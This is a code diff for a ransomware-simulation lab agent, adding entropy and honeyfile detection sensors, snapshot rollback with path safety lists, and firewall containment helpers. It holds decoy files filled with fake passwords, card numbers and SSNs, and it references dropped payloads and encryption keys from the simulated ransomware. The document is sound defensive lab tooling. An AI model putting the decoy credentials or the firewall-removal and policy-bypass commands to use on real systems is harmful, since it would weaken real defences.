+                        alert = {
+                            "event_type": "POSSIBLE_RANSOMWARE",
+                            "timestamp": datetime.utcnow().isoformat(),
+                            "file": filepath_str,
+                            "old_entropy": round(old_entropy, 2),
+                            "new_entropy": round(new_entropy, 2),
+                            "entropy_jump": round(entropy_jump, 2),
+                            "mitre_technique": "T1486"
+                        }
+                        alerts_generated.append(alert)
+                        
+                        self.logger.warning(
+                            f"[ENTROPY MONITOR] ALERT: POSSIBLE_RANSOMWARE detected! "
+                            f"file=\"{filepath_str}\" old={old_entropy:.2f} new={new_entropy:.2f} jump={entropy_jump:.2f}"
+                        )
+                        
+                        # Report to backend
+                        self._report_sensor_alert(run_id, alert)
+                    
+                    # Update baseline
+                    file_baselines[filepath_str] = new_entropy
+            
+            time.sleep(scan_interval)
+        
+        self.logger.info(f"[ENTROPY MONITOR] Completed {scan_count} scans, {len(alerts_generated)} alerts generated")
+        
+        return (True, json.dumps({
+            "status": "completed",
+            "scans": scan_count,
+            "files_monitored": len(file_baselines),
+            "alerts_generated": len(alerts_generated),
+            "alerts": alerts_generated
+        }))
+    
+    def start_honeyfile_monitor(self, parameters: dict) -> tuple:
+        """
+        Start honeyfile deception monitor.
+        
+        Monitors decoy files that should never be accessed by legitimate users.
+        Any access indicates potential malicious activity.
+        
+        Parameters:
+            honeyfiles: List of honeyfile paths to monitor
+            create_honeyfiles: Whether to create honeyfiles if they don't exist
+            duration: How long to monitor in seconds (default: 300)
+            run_id: Associated run ID for reporting
+        """
+        default_honeyfiles = [
+            os.path.join(TEST_DIR, "passwords.txt"),
+            os.path.join(TEST_DIR, "credit_cards.csv"),
+            os.path.join(TEST_DIR, "Employee_SSNs.txt"),
+            os.path.join(TEST_DIR, "bank_accounts.xlsx"),
+            os.path.join(TEST_DIR, "private_keys.pem"),
+        ]
+        
+        honeyfiles = parameters.get("honeyfiles", default_honeyfiles)
+        create_honeyfiles = parameters.get("create_honeyfiles", True)
+        duration = parameters.get("duration", 300)
+        run_id = parameters.get("run_id")
+        
+        self.logger.info(f"[HONEYFILE MONITOR] Starting deception-based detection")
+        self.logger.info(f"[HONEYFILE MONITOR] Monitoring {len(honeyfiles)} honeyfiles")
+        
+        # Create honeyfiles if requested
+        if create_honeyfiles:
+            self._create_honeyfiles(honeyfiles)
+        
+        # Record initial state (modification times)
+        file_states = {}
+        for hf in honeyfiles:
+            if os.path.exists(hf):
+                stat = os.stat(hf)
+                file_states[hf] = {
+                    "mtime": stat.st_mtime,
+                    "size": stat.st_size,
+                    "exists": True
+                }
+            else:
+                file_states[hf] = {"exists": False}
+        
+        alerts_generated = []
+        start_time = time.time()
+        scan_count = 0
+        
+        # Monitor loop
+        while time.time() - start_time < duration:
+            scan_count += 1
+            
+            for hf in honeyfiles:
+                old_state = file_states.get(hf, {"exists": False})
+                
+                if os.path.exists(hf):
+                    stat = os.stat(hf)
+                    new_state = {
+                        "mtime": stat.st_mtime,
+                        "size": stat.st_size,
+                        "exists": True
+                    }
+                    
+                    # Check if file was modified
+                    if old_state.get("exists") and (
+                        new_state["mtime"] != old_state.get("mtime") or
+                        new_state["size"] != old_state.get("size")
+                    ):
+                        alert = {
+                            "event_type": "HONEYFILE_TOUCHED",
+                            "timestamp": datetime.utcnow().isoformat(),
+                            "file": hf,
+                            "old_size": old_state.get("size"),
+                            "new_size": new_state["size"],
+                            "mitre_technique": "T1083"
+                        }
+                        alerts_generated.append(alert)
+                        
+                        self.logger.warning(
+                            f"[HONEYFILE MONITOR] ALERT: HONEYFILE_TOUCHED file=\"{hf}\""
+                        )
+                        
+                        self._report_sensor_alert(run_id, alert)
+                    
+                    file_states[hf] = new_state
+                    
+                else:
+                    # File was deleted
+                    if old_state.get("exists"):
+                        alert = {
+                            "event_type": "HONEYFILE_DELETED",
+                            "timestamp": datetime.utcnow().isoformat(),
+                            "file": hf,
+                            "mitre_technique": "T1485"
+                        }
+                        alerts_generated.append(alert)
+                        
+                        self.logger.warning(
+                            f"[HONEYFILE MONITOR] ALERT: HONEYFILE_DELETED file=\"{hf}\""
+                        )
+                        
+                        self._report_sensor_alert(run_id, alert)
+                    
+                    file_states[hf] = {"exists": False}
+            
+            time.sleep(2)  # Check every 2 seconds
+        
+        self.logger.info(f"[HONEYFILE MONITOR] Completed {scan_count} scans, {len(alerts_generated)} alerts generated")
+        
+        return (True, json.dumps({
+            "status": "completed",
+            "scans": scan_count,
+            "honeyfiles_monitored": len(honeyfiles),
+            "alerts_generated": len(alerts_generated),
+            "alerts": alerts_generated
+        }))
+    
+    def _create_honeyfiles(self, honeyfiles: list):
+        """Create honeyfile decoys with realistic-looking fake content."""
+        honeyfile_contents = {
+            "passwords.txt": """# Corporate Password List - CONFIDENTIAL
+admin:P@ssw0rd123!
+root:SuperSecret2024
+backup_svc:Backup#2024$
+sql_admin:SqlServer@dm1n
+domain_admin:D0ma1nAdm1n!
+""",
+            "credit_cards.csv": """card_holder,card_number,expiry,cvv
+John Smith,4532-1234-5678-9012,12/25,123
+Jane Doe,5412-7534-2341-8890,06/26,456
+Bob Wilson,3782-822463-10005,09/24,7890
+Alice Brown,6011-1234-5678-9012,03/25,321
+""",
+            "Employee_SSNs.txt": """# Employee SSN Database - RESTRICTED
+EMP001: John Smith - 123-45-6789
+EMP002: Jane Doe - 234-56-7890
+EMP003: Bob Wilson - 345-67-8901
+EMP004: Alice Brown - 456-78-9012
+EMP005: Charlie Davis - 567-89-0123
+""",
+            "bank_accounts.xlsx": """This is a fake Excel file for honeyfile detection.
+Account data would be here in a real scenario.
+DO NOT USE - DECOY FILE
+""",
+            "private_keys.pem": """-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyf8MFAKE_KEY_DO_NOT_USE
+THIS_IS_A_HONEYPOT_FILE_FOR_DETECTION_PURPOSES_ONLY
+-----END RSA PRIVATE KEY-----
+"""
+        }
+        
+        for hf in honeyfiles:
+            if not os.path.exists(hf):
+                try:
+                    os.makedirs(os.path.dirname(hf), exist_ok=True)
+                    filename = os.path.basename(hf)
+                    content = honeyfile_contents.get(filename, f"HONEYPOT FILE - {filename}\nDO NOT ACCESS")
+                    with open(hf, 'w') as f:
+                        f.write(content)
+                    self.logger.info(f"[HONEYFILE MONITOR] Created honeyfile: {hf}")
+                except Exception as e:
+                    self.logger.warning(f"[HONEYFILE MONITOR] Failed to create honeyfile {hf}: {e}")
+    
+    def _report_sensor_alert(self, run_id: Optional[int], alert: dict):
+        """Report sensor alert to backend."""
+        if not run_id:
+            return
+        
+        try:
+            payload = {
+                "run_id": run_id,
+                "agent_id": self.agent_id,
+                "alert_type": alert.get("event_type"),
+                "timestamp": alert.get("timestamp"),
+                "details": alert,
+                "severity": 80 if alert.get("event_type") == "POSSIBLE_RANSOMWARE" else 60,
+                "mitre_technique": alert.get("mitre_technique")
+            }
+            
+            response = requests.post(
+                f"{self.backend_url}/api/siem/agent/sensor-alert",
+                json=payload,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                self.logger.debug(f"[SENSOR] Alert reported to backend")
+            else:
+                self.logger.warning(f"[SENSOR] Alert report failed: {response.status_code}")
+                
+        except Exception as e:
+            self.logger.warning(f"[SENSOR] Failed to report alert: {e}")
+    
+    def run_detection_sensors(self, parameters: dict) -> tuple:
+        """
+        Run both entropy and honeyfile sensors concurrently.
+        
+        This is the main entry point for Blue Team detection capabilities.
+        
+        Parameters:
+            watch_dirs: Directories to monitor for entropy changes
+            honeyfiles: Honeyfile paths to monitor
+            duration: Monitoring duration in seconds
+            run_id: Associated run ID
+        """
+        import threading
+        
+        run_id = parameters.get("run_id")
+        duration = parameters.get("duration", 300)
+        
+        self.logger.info(f"[SENSORS] Starting ransomware detection sensors for {duration}s")
+        
+        results = {"entropy": None, "honeyfile": None}
+        
+        def run_entropy():
+            results["entropy"] = self.start_entropy_monitor({
+                "watch_dirs": parameters.get("watch_dirs", [TEST_DIR]),
+                "duration": duration,
+                "run_id": run_id
+            })
+        
+        def run_honeyfile():
+            results["honeyfile"] = self.start_honeyfile_monitor({
+                "honeyfiles": parameters.get("honeyfiles"),
+                "duration": duration,
+                "run_id": run_id
+            })
+        
+        # Start both monitors in parallel
+        entropy_thread = threading.Thread(target=run_entropy)
+        honeyfile_thread = threading.Thread(target=run_honeyfile)
+        
+        entropy_thread.start()
+        honeyfile_thread.start()
+        
+        entropy_thread.join()
+        honeyfile_thread.join()
+        
+        self.logger.info(f"[SENSORS] Detection sensors completed")
+        
+        return (True, json.dumps({
+            "status": "completed",
+            "entropy_monitor": json.loads(results["entropy"][1]) if results["entropy"] else None,
+            "honeyfile_monitor": json.loads(results["honeyfile"][1]) if results["honeyfile"] else None
+        }))
     
     # =========================================================================
     # RESPONSE ACTIONS
@@ -2052,7 +3015,2271 @@ class RansomRunAgent:
             return (False, str(e))
     
     # =========================================================================
+    # AUTOROLLBACK TASK HANDLERS
+    # =========================================================================
+    
+    # Default safe paths for rollback (lab directories only)
+    ROLLBACK_SAFE_PATHS = [
+        r"C:\RansomTest",
+        r"C:\RansomLab",
+        r"C:\Users\Public\Documents",
+    ]
+    
+    # Blocked paths (system directories - NEVER modify)
+    ROLLBACK_BLOCKED_PATHS = [
+        r"C:\Windows",
+        r"C:\Program Files",
+        r"C:\Program Files (x86)",
+        r"C:\ProgramData",
+        r"C:\$Recycle.Bin",
+        r"C:\System Volume Information",
+    ]
+    
+    def _is_path_safe_for_rollback(self, path: str, safe_paths: List[str]) -> Tuple[bool, str]:
+        """Check if a path is safe to operate on for rollback."""
+        if not path:
+            return False, "Empty path"
+        
+        norm_path = os.path.normpath(path).lower()
+        
+        # Check blocked paths first
+        for blocked in self.ROLLBACK_BLOCKED_PATHS:
+            if norm_path.startswith(blocked.lower()):
+                return False, f"Path is in blocked system directory: {blocked}"
+        
+        # Check sensitive user paths
+        sensitive = ["appdata", "application data", "local settings", "ntuser.dat"]
+        for sens in sensitive:
+            if sens in norm_path:
+                return False, f"Path contains sensitive user directory: {sens}"
+        
+        # Check if path is under a safe path
+        for safe_path in safe_paths:
+            safe_norm = os.path.normpath(safe_path).lower()
+            if norm_path.startswith(safe_norm):
+                return True, "Path is under allowed safe path"
+        
+        return False, "Path is not under any configured safe path"
+    
+    def _compute_file_hash(self, filepath: str) -> Optional[str]:
+        """Compute SHA256 hash of a file."""
+        try:
+            import hashlib
+            sha256 = hashlib.sha256()
+            with open(filepath, 'rb') as f:
+                for chunk in iter(lambda: f.read(8192), b''):
+                    sha256.update(chunk)
+            return sha256.hexdigest()
+        except Exception as e:
+            self.logger.error(f"Hash computation failed for {filepath}: {e}")
+            return None
+    
+    def rollback_restore_from_snapshot(self, parameters: dict) -> Tuple[bool, str]:
+        """
+        Restore files from backup snapshot.
+        
+        SAFETY CONSTRAINTS:
+        - Only operates on configured safe paths (lab directories)
+        - System directories are ALWAYS blocked
+        - Supports dry_run mode (simulate without changes)
+        - Full audit trail with before/after hashes
+        
+        Parameters:
+            plan_id: Rollback plan ID
+            dry_run: If True, simulate without making changes
+            safe_paths: List of allowed paths
+            conflict_policy: QUARANTINE, OVERWRITE, or SKIP
+            cleanup_extensions: Extensions to clean up
+            restore_actions: List of file actions to perform
+            conflict_directory: Where to move conflicting files
+        """
+        plan_id = parameters.get("plan_id")
+        dry_run = parameters.get("dry_run", False)
+        safe_paths = parameters.get("safe_paths", self.ROLLBACK_SAFE_PATHS)
+        conflict_policy = parameters.get("conflict_policy", "QUARANTINE")
+        conflict_dir = parameters.get("conflict_directory", rf"C:\RansomRun\rollback_conflicts\{plan_id}")
+        restore_actions = parameters.get("restore_actions", [])
+        
+        self.logger.info(f"[ROLLBACK] Starting restore for plan {plan_id} (dry_run={dry_run})")
+        self.logger.info(f"[ROLLBACK] Safe paths: {safe_paths}")
+        self.logger.info(f"[ROLLBACK] Files to process: {len(restore_actions)}")
+        
+        # Create conflict directory if needed
+        if not dry_run and conflict_policy == "QUARANTINE":
+            os.makedirs(conflict_dir, exist_ok=True)
+        
+        file_results = []
+        restored_count = 0
+        failed_count = 0
+        skipped_count = 0
+        
+        for action in restore_actions:
+            action_id = action.get("action_id")
+            original_path = action.get("original_path")
+            backup_path = action.get("backup_path")
+            expected_hash = action.get("expected_hash")
+            
+            result = {
+                "action_id": action_id,
+                "original_path": original_path,
+                "success": False,
+                "before_hash": None,
+                "after_hash": None,
+                "hash_verified": None,
+                "error": None,
+                "conflict_backup_path": None
+            }
+            
+            # Validate path safety
+            is_safe, reason = self._is_path_safe_for_rollback(original_path, safe_paths)
+            if not is_safe:
+                result["error"] = f"Path not safe: {reason}"
+                skipped_count += 1
+                file_results.append(result)
+                self.logger.warning(f"[ROLLBACK] SKIP: {original_path} - {reason}")
+                continue
+            
+            try:
+                # Check if file currently exists
+                file_exists = os.path.exists(original_path)
+                
+                if file_exists:
+                    # Compute hash of current file
+                    result["before_hash"] = self._compute_file_hash(original_path)
+                    
+                    # Check if file is unchanged (same as backup)
+                    if result["before_hash"] == expected_hash:
+                        result["success"] = True
+                        result["hash_verified"] = True
+                        result["after_hash"] = result["before_hash"]
+                        skipped_count += 1
+                        self.logger.info(f"[ROLLBACK] SKIP (unchanged): {original_path}")
+                        file_results.append(result)
+                        continue
+                    
+                    # Handle conflict based on policy
+                    if conflict_policy == "QUARANTINE":
+                        # Move current file to conflict directory
+                        conflict_path = os.path.join(
+                            conflict_dir, 
+                            os.path.basename(original_path) + f".conflict_{plan_id}"
+                        )
+                        if not dry_run:
+                            os.makedirs(os.path.dirname(conflict_path), exist_ok=True)
+                            shutil.move(original_path, conflict_path)
+                        result["conflict_backup_path"] = conflict_path
+                        self.logger.info(f"[ROLLBACK] CONFLICT: Moved {original_path} to {conflict_path}")
+                    elif conflict_policy == "SKIP":
+                        result["error"] = "File exists and differs - skipped due to conflict policy"
+                        skipped_count += 1
+                        file_results.append(result)
+                        continue
+                    # OVERWRITE: just proceed with restore
+                
+                # Restore file from backup
+                if backup_path and os.path.exists(backup_path):
+                    if not dry_run:
+                        # Ensure directory exists
+                        os.makedirs(os.path.dirname(original_path), exist_ok=True)
+                        shutil.copy2(backup_path, original_path)
+                    
+                    # Verify restored file
+                    if not dry_run:
+                        result["after_hash"] = self._compute_file_hash(original_path)
+                        result["hash_verified"] = (result["after_hash"] == expected_hash)
+                    else:
+                        result["after_hash"] = expected_hash
+                        result["hash_verified"] = True
+                    
+                    result["success"] = True
+                    restored_count += 1
+                    self.logger.info(f"[ROLLBACK] RESTORED: {original_path} (verified={result['hash_verified']})")
+                else:
+                    result["error"] = f"Backup file not found: {backup_path}"
+                    failed_count += 1
+                    self.logger.error(f"[ROLLBACK] FAIL: {original_path} - backup not found")
+                    
+            except PermissionError as e:
+                result["error"] = f"Permission denied: {e}"
+                failed_count += 1
+                self.logger.error(f"[ROLLBACK] FAIL: {original_path} - permission denied")
+            except Exception as e:
+                result["error"] = str(e)
+                failed_count += 1
+                self.logger.error(f"[ROLLBACK] FAIL: {original_path} - {e}")
+            
+            file_results.append(result)
+        
+        # Report results back to backend
+        try:
+            response = requests.post(
+                f"{self.backend_url}/api/rollback/result/{plan_id}",
+                json={"file_results": file_results},
+                timeout=30
+            )
+            if response.status_code == 200:
+                self.logger.info(f"[ROLLBACK] Results reported to backend")
+            else:
+                self.logger.warning(f"[ROLLBACK] Failed to report results: {response.status_code}")
+        except Exception as e:
+            self.logger.error(f"[ROLLBACK] Failed to report results: {e}")
+        
+        summary = f"Rollback complete: {restored_count} restored, {skipped_count} skipped, {failed_count} failed"
+        self.logger.info(f"[ROLLBACK] {summary}")
+        
+        return (failed_count == 0, summary)
+    
+    def rollback_verify_hashes(self, parameters: dict) -> Tuple[bool, str]:
+        """
+        Verify that restored files match expected hashes.
+        
+        Parameters:
+            plan_id: Rollback plan ID
+            files: List of {path, expected_hash} to verify
+        """
+        plan_id = parameters.get("plan_id")
+        files = parameters.get("files", [])
+        
+        self.logger.info(f"[ROLLBACK] Verifying hashes for plan {plan_id} ({len(files)} files)")
+        
+        verified = 0
+        failed = 0
+        results = []
+        
+        for file_info in files:
+            path = file_info.get("path")
+            expected_hash = file_info.get("expected_hash")
+            
+            if not os.path.exists(path):
+                results.append({"path": path, "verified": False, "error": "File not found"})
+                failed += 1
+                continue
+            
+            actual_hash = self._compute_file_hash(path)
+            
+            if actual_hash == expected_hash:
+                results.append({"path": path, "verified": True, "hash": actual_hash})
+                verified += 1
+            else:
+                results.append({
+                    "path": path, 
+                    "verified": False, 
+                    "expected": expected_hash, 
+                    "actual": actual_hash
+                })
+                failed += 1
+        
+        summary = f"Hash verification: {verified} passed, {failed} failed"
+        self.logger.info(f"[ROLLBACK] {summary}")
+        
+        return (failed == 0, json.dumps({"summary": summary, "results": results}))
+    
+    def rollback_cleanup_extensions(self, parameters: dict) -> Tuple[bool, str]:
+        """
+        Clean up ransomware extensions from files.
+        
+        Removes extensions like .locked, .encrypted, .dwcrypt from file names.
+        Only operates on safe paths.
+        
+        Parameters:
+            safe_paths: List of allowed paths to scan
+            extensions: List of extensions to remove (e.g., [".locked", ".encrypted"])
+            dry_run: If True, simulate without making changes
+        """
+        safe_paths = parameters.get("safe_paths", self.ROLLBACK_SAFE_PATHS)
+        extensions = parameters.get("extensions", [".locked", ".encrypted", ".dwcrypt"])
+        dry_run = parameters.get("dry_run", False)
+        
+        self.logger.info(f"[ROLLBACK] Cleaning up extensions: {extensions}")
+        self.logger.info(f"[ROLLBACK] Scanning paths: {safe_paths}")
+        
+        cleaned = 0
+        skipped = 0
+        failed = 0
+        
+        for safe_path in safe_paths:
+            if not os.path.exists(safe_path):
+                continue
+            
+            for root, dirs, files in os.walk(safe_path):
+                for filename in files:
+                    for ext in extensions:
+                        if filename.endswith(ext):
+                            old_path = os.path.join(root, filename)
+                            new_name = filename[:-len(ext)]  # Remove extension
+                            new_path = os.path.join(root, new_name)
+                            
+                            # Validate path safety
+                            is_safe, _ = self._is_path_safe_for_rollback(old_path, safe_paths)
+                            if not is_safe:
+                                skipped += 1
+                                continue
+                            
+                            try:
+                                if not dry_run:
+                                    # Check if target already exists
+                                    if os.path.exists(new_path):
+                                        self.logger.warning(f"[ROLLBACK] Target exists, skipping: {new_path}")
+                                        skipped += 1
+                                        continue
+                                    
+                                    os.rename(old_path, new_path)
+                                
+                                cleaned += 1
+                                self.logger.info(f"[ROLLBACK] Cleaned: {filename} -> {new_name}")
+                            except Exception as e:
+                                failed += 1
+                                self.logger.error(f"[ROLLBACK] Failed to clean {filename}: {e}")
+                            
+                            break  # Only process first matching extension
+        
+        summary = f"Extension cleanup: {cleaned} cleaned, {skipped} skipped, {failed} failed"
+        self.logger.info(f"[ROLLBACK] {summary}")
+        
+        return (failed == 0, summary)
+    
+    def backup_create_snapshot(self, parameters: dict) -> Tuple[bool, str]:
+        """
+        Create a baseline snapshot of files in safe paths.
+        
+        ACTUALLY COPIES files to a backup directory for real rollback support.
+        
+        Parameters:
+            snapshot_id: Snapshot record ID
+            snapshot_name: Name for the snapshot
+            safe_paths: List of paths to backup
+            label: Snapshot label
+        """
+        snapshot_id = parameters.get("snapshot_id")
+        snapshot_name = parameters.get("snapshot_name", f"snapshot_{snapshot_id}")
+        safe_paths = parameters.get("safe_paths", self.ROLLBACK_SAFE_PATHS)
+        label = parameters.get("label", "baseline")
+        
+        # Create backup directory
+        backup_base_dir = rf"C:\RansomRun\backups\{snapshot_name}"
+        os.makedirs(backup_base_dir, exist_ok=True)
+        
+        self.logger.info(f"[SNAPSHOT] Creating snapshot: {snapshot_name}")
+        self.logger.info(f"[SNAPSHOT] Backup directory: {backup_base_dir}")
+        self.logger.info(f"[SNAPSHOT] Scanning paths: {safe_paths}")
+        
+        manifest = {
+            "snapshot_id": snapshot_id,
+            "snapshot_name": snapshot_name,
+            "label": label,
+            "backup_directory": backup_base_dir,
+            "created_at": datetime.utcnow().isoformat(),
+            "hostname": self.hostname,
+            "agent_id": self.agent_id,
+            "files": []
+        }
+        
+        total_files = 0
+        backed_up = 0
+        failed = 0
+        
+        for safe_path in safe_paths:
+            if not os.path.exists(safe_path):
+                self.logger.warning(f"[SNAPSHOT] Path not found: {safe_path}")
+                continue
+            
+            for root, dirs, files in os.walk(safe_path):
+                for filename in files:
+                    filepath = os.path.join(root, filename)
+                    total_files += 1
+                    
+                    # Skip hidden/system files
+                    if filename.startswith('.'):
+                        continue
+                    
+                    try:
+                        # Get file info
+                        stat = os.stat(filepath)
+                        file_size = stat.st_size
+                        mtime = stat.st_mtime
+                        
+                        # Compute hash for smaller files
+                        file_hash = None
+                        if file_size < 50 * 1024 * 1024:  # 50MB limit
+                            file_hash = self._compute_file_hash(filepath)
+                        
+                        # Create backup path preserving directory structure
+                        # e.g., C:\RansomTest\doc.txt -> C:\RansomRun\backups\snapshot_1\RansomTest\doc.txt
+                        rel_path = os.path.relpath(filepath, os.path.splitdrive(filepath)[0] + os.sep)
+                        backup_path = os.path.join(backup_base_dir, rel_path)
+                        
+                        # Create backup directory structure and copy file
+                        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
+                        shutil.copy2(filepath, backup_path)
+                        
+                        manifest["files"].append({
+                            "path": filepath,
+                            "backup_path": backup_path,
+                            "size": file_size,
+                            "mtime": mtime,
+                            "hash": file_hash,
+                            "backed_up": True
+                        })
+                        backed_up += 1
+                        self.logger.debug(f"[SNAPSHOT] Backed up: {filepath} -> {backup_path}")
+                        
+                    except Exception as e:
+                        self.logger.error(f"[SNAPSHOT] Error processing {filepath}: {e}")
+                        manifest["files"].append({
+                            "path": filepath,
+                            "error": str(e),
+                            "backed_up": False
+                        })
+                        failed += 1
+        
+        manifest["total_files"] = total_files
+        manifest["files_backed_up"] = backed_up
+        manifest["files_failed"] = failed
+        
+        # Report snapshot completion to backend
+        try:
+            response = requests.post(
+                f"{self.backend_url}/api/rollback/snapshot/complete",
+                json={
+                    "snapshot_id": snapshot_id,
+                    "manifest": manifest,
+                    "total_files": total_files,
+                    "files_backed_up": backed_up,
+                    "files_failed": failed
+                },
+                timeout=30
+            )
+            if response.status_code == 200:
+                self.logger.info(f"[SNAPSHOT] Reported to backend successfully")
+            else:
+                self.logger.warning(f"[SNAPSHOT] Failed to report: {response.status_code}")
+        except Exception as e:
+            self.logger.error(f"[SNAPSHOT] Failed to report to backend: {e}")
+        
+        summary = f"Snapshot created: {backed_up} files backed up to {backup_base_dir}, {failed} failed"
+        self.logger.info(f"[SNAPSHOT] {summary}")
+        
+        return (failed == 0, summary)
+    
+    def rollback_dry_run(self, parameters: dict) -> Tuple[bool, str]:
+        """
+        Perform a dry run of rollback without making changes.
+        
+        Returns what would be restored/skipped/conflicted.
+        """
+        # Just call restore with dry_run=True
+        parameters["dry_run"] = True
+        return self.rollback_restore_from_snapshot(parameters)
+    
+    # =========================================================================
     # MAIN LOOP
+    # =========================================================================
+    # CONTAINMENT & ISOLATION METHODS
+    # =========================================================================
+    
+    def _report_ransomware_artifacts(self, run_id: Optional[int], scenario_config: dict, directories: List[str]):
+        """Report ransomware artifact paths to backend for containment UI."""
+        if not run_id:
+            return
+        
+        try:
+            # Determine entry path (the script/payload that was executed)
+            entry_path = sys.argv[0] if sys.argv else None
+            if entry_path:
+                entry_path = str(Path(entry_path).resolve())
+            
+            # Get working directory
+            working_dir = os.getcwd()
+            
+            # Target directory from config
+            target_dir = directories[0] if directories else TEST_DIR
+            
+            # Look for ransom note path
+            ransom_note_path = None
+            ransom_config = scenario_config.get("ransom_note", {})
+            if ransom_config:
+                note_filename = ransom_config.get("filename", "README_RESTORE.txt")
+                potential_note = Path(target_dir) / note_filename
+                if potential_note.exists():
+                    ransom_note_path = str(potential_note)
+            
+            # Look for encryption key (LAB ONLY)
+            encryption_key_path = None
+            key_file = Path(target_dir) / "encryption_key.key"
+            if key_file.exists():
+                encryption_key_path = str(key_file)
+            
+            # Process info
+            process_info = {
+                "pid": os.getpid(),
+                "name": Path(sys.executable).name if sys.executable else "python.exe",
+                "command_line": " ".join(sys.argv) if sys.argv else "",
+                "sha256": None  # Could compute hash if needed
+            }
+            
+            # Look for dropped payload (polymorphic mode)
+            dropped_payload_path = None
+            polymorphic_dir = Path(r"C:\ProgramData\RansomRun\Payloads")
+            if polymorphic_dir.exists():
+                payloads = list(polymorphic_dir.glob("*.py")) + list(polymorphic_dir.glob("*.exe"))
+                if payloads:
+                    dropped_payload_path = str(payloads[0])
+            
+            payload = {
+                "run_id": run_id,
+                "host": self.hostname,
+                "ransomware": {
+                    "entry_path": entry_path,
+                    "dropped_payload_path": dropped_payload_path,
+                    "working_dir": working_dir,
+                    "target_dir": target_dir,
+                    "ransom_note_path": ransom_note_path,
+                    "encryption_key_path": encryption_key_path,
+                    "process": process_info
+                }
+            }
+            
+            response = requests.post(
+                f"{self.backend_url}/api/runs/{run_id}/containment/report-artifacts",
+                json=payload,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                self.logger.info("Ransomware artifacts reported for containment")
+            else:
+                self.logger.warning(f"Failed to report artifacts: {response.status_code}")
+                
+        except Exception as e:
+            self.logger.warning(f"Failed to report ransomware artifacts: {e}")
+    
+    # =========================================================================
+    # CONTAINMENT UTILITIES - Admin Check, PowerShell, Firewall State
+    # =========================================================================
+    #
+    # TROUBLESHOOTING NOTES (for operators/developers):
+    # =================================================
+    #
+    # 1. HOW TO RUN AGENT AS ADMINISTRATOR:
+    #    - Right-click Command Prompt -> "Run as administrator"
+    #    - Then: cd C:\path\to\RansomRun && python agent\agent.py
+    #    - Or create a shortcut with "Run as administrator" checked
+    #
+    # 2. WHERE STATE FILE IS STORED:
+    #    - C:\ProgramData\RansomRun\containment_state.json
+    #    - Contains: original firewall profiles, isolation timestamp, backend IP
+    #    - Delete this file to force a fresh state
+    #
+    # 3. HOW TO VERIFY FIREWALL RULES EXIST:
+    #    PowerShell (Admin):
+    #      Get-NetFirewallRule | Where-Object {$_.DisplayName -like 'RANSOMRUN_*'}
+    #    Or netsh:
+    #      netsh advfirewall firewall show rule name=all | findstr "RANSOMRUN"
+    #
+    # 4. HOW TO MANUALLY REMOVE ALL RANSOMRUN RULES:
+    #    PowerShell (Admin):
+    #      Get-NetFirewallRule | Where-Object {$_.DisplayName -like 'RANSOMRUN_*'} | Remove-NetFirewallRule
+    #    Or netsh (one by one):
+    #      netsh advfirewall firewall delete rule name=RANSOMRUN_BACKEND_OUT
+    #      netsh advfirewall firewall delete rule name=RANSOMRUN_BACKEND_IN
+    #      (etc.)
+    #
+    # 5. HOW TO CHECK CURRENT FIREWALL PROFILE STATE:
+    #    PowerShell:
+    #      Get-NetFirewallProfile | Select Name, Enabled, DefaultInboundAction, DefaultOutboundAction
+    #    Or netsh:
+    #      netsh advfirewall show allprofiles
+    #
+    # 6. HOW TO MANUALLY RESTORE OUTBOUND CONNECTIVITY:
+    #    netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound
+    #
+    # 7. LOGS TO CHECK:
+    #    - Agent log: C:\RansomTest\agent.log
+    #    - Windows Event Viewer: Windows Logs -> Security (for firewall changes)
+    #
+    # 8. COMMON ISSUES:
+    #    - "Administrator privileges required" -> Run agent as Admin
+    #    - "Already isolated" -> Use force=True or delete state file
+    #    - Restore doesn't work -> Check if RANSOMRUN rules still exist
+    #    - Can't reach backend after isolation -> Check backend_ip parameter
+    #
+    # =========================================================================
+    
+    # Constants for containment
+    CONTAINMENT_STATE_DIR = r"C:\ProgramData\RansomRun"
+    CONTAINMENT_STATE_FILE = r"C:\ProgramData\RansomRun\containment_state.json"
+    RANSOMRUN_RULE_PREFIX = "RANSOMRUN_"
+    RANSOMRUN_RULE_GROUP = "RansomRun Containment"
+    
+    def _is_admin(self) -> bool:
+        """
+        Fast admin check using ctypes (preferred) or PowerShell fallback.
+        Returns True if running with Administrator privileges.
+        """
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            pass
+        
+        # Fallback to PowerShell check
+        try:
+            result = subprocess.run(
+                ["powershell", "-ExecutionPolicy", "Bypass", "-Command",
+                 "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"],
+                capture_output=True,
+                text=True,
+                timeout=10
+            )
+            return result.stdout.strip().lower() == "true"
+        except Exception as e:
+            self.logger.warning(f"Admin check failed: {e}")
+            return False
+    
+    def _check_admin_privileges(self) -> bool:
+        """Legacy alias for _is_admin()."""
+        return self._is_admin()
+
+    def _run_powershell(self, command: str, timeout: int = 60) -> tuple:
+        """
+        Run a PowerShell command and return (success, stdout, stderr).
+        Logs the command and output for debugging.
+        """
+        self.logger.debug(f"[PS] Running: {command[:200]}...")
+        try:
+            result = subprocess.run(
+                ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+            success = result.returncode == 0
+            if not success:
+                self.logger.warning(f"[PS] Command failed (rc={result.returncode}): {result.stderr[:500]}")
+            return (success, result.stdout, result.stderr)
+        except subprocess.TimeoutExpired:
+            self.logger.error(f"[PS] Command timed out after {timeout}s")
+            return (False, "", f"Command timed out after {timeout}s")
+        except Exception as e:
+            self.logger.error(f"[PS] Command error: {e}")
+            return (False, "", str(e))
+
+    def _get_firewall_profiles_state(self) -> dict:
+        """
+        Capture current firewall profile states using PowerShell.
+        Returns dict with Domain/Private/Public profile settings.
+        """
+        self.logger.info("[CONTAINMENT] Capturing firewall profile states...")
+        
+        ps_command = """
+$profiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue | ForEach-Object {
+    @{
+        Name = $_.Name
+        Enabled = $_.Enabled.ToString()
+        DefaultInboundAction = $_.DefaultInboundAction.ToString()
